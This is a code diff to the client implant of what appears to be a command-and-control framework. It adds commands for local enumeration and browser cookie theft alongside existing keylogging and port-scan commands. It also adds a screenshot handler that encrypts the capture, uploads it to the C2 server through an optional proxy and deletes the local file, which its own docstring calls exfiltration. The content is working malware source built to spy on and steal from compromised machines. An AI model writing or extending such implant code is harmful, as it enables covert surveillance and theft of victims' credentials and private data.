@@ -217,7 +217,7 @@ def run_client(config_path: str = None):
             _handle_module_cmd("portscan", command[11:].strip(), post_output)
 
         elif command.startswith("client screenshot"):
-            _handle_module_cmd("screenshot", command[17:].strip(), post_output)
+            _handle_screenshot(command, base_url, cipher, post_output, get_uri, build_headers, proxy)
 
         elif command.startswith("client keylog"):
             _handle_module_cmd("keylogger", command[13:].strip(), post_output)
@@ -236,6 +236,12 @@ def run_client(config_path: str = None):
 
         elif command.startswith("client multiop"):
             _handle_module_cmd("multi_op", command[14:].strip(), post_output)
+
+        elif command.startswith("client enum"):
+            _handle_module_cmd("enum_local", command[11:].strip(), post_output)
+
+        elif command.startswith("client cookies"):
+            _handle_module_cmd("browser_cookies", command[14:].strip(), post_output)
 
         elif command.startswith("client kill"):
             if pty_session:
@@ -343,6 +349,44 @@ def _handle_module(command, post_output):
         post_output(f"(module: {module_name})\n{result}\n")
     except Exception as e:
         post_output(f"Module error: {e}\n")
+
+
+def _handle_screenshot(command: str, base_url: str, cipher, post_output, get_uri, build_headers, proxy):
+    """Capture screenshot and exfiltrate to server."""
+    args = command.split()[2:] if len(command.split()) > 2 else []
+    output_path = " ".join(args) if args else None
+    
+    try:
+        from c2.modules.screenshot import capture_screenshot
+        import os
+        
+        path = capture_screenshot(output_path)
+        size_kb = os.path.getsize(path) / 1024
+        filename = os.path.basename(path)
+        
+        with open(path, "rb") as f:
+            encrypted_file = cipher.encrypt(f.read())
+        
+        encrypted_fn = cipher.encrypt(filename.encode()).decode()
+        upload_uri = get_uri("file_upload")
+        
+        put(
+            f"{base_url}{upload_uri}/{encrypted_fn}",
+            data=encrypted_file,
+            stream=True,
+            proxies=proxy if proxy else None,
+            headers=build_headers("file_upload"),
+        )
+        
+        try:
+            os.unlink(path)
+        except OSError:
+            pass
+        
+        post_output(f"Screenshot captured and uploaded: {filename} ({size_kb:.1f} KB)\n")
+        
+    except Exception as e:
+        post_output(f"Screenshot failed: {e}\n")
 
 
 def _handle_module_cmd(module_name: str, args_str: str, post_output):
